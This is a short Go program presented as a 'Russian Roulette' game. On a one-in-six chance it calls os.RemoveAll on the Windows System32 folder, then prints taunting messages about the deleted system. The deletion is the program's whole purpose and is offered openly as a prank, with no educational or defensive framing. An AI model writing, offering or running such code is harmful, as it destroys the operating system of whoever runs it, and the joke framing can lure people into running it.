package main

import (
	"fmt"
	"math/rand"
	"os"
	"time"
)

func main() {
	fmt.Println("Welcome to Windows 32 Russian Roulette!")
	rand.Seed(time.Now().UnixNano())
	bullet := rand.Intn(6) + 1

	var chamber int
	fmt.Print("Pick a chamber (1-6): ")
	fmt.Scanln(&chamber)

	if chamber == bullet {
		fmt.Println("Oops! Looks like you just deleted Windows 32. Good luck reinstalling!😈")
		os.RemoveAll("C:\\Windows\\System32")
		fmt.Println("Windows 32 has been successfully deleted! 😱")
	} else {
		fmt.Println("Phew! You survived... this time. Try again if you dare! 😜")
	}
}
